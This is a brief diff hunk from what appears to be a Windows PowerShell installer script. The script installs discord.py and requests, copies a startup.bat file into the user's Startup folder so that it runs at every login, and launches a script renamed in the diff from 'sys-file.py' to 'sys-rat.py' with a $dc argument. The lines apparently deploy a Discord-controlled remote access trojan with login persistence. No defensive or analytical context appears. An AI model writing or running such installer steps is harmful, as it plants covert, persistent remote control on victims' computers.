@@ -10,4 +10,4 @@ py -m pip install discord.py requests
 
 Copy-Item 'C:\system32\startup.bat' "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
-Python sys-file.py $dc
+Python sys-rat.py $dc
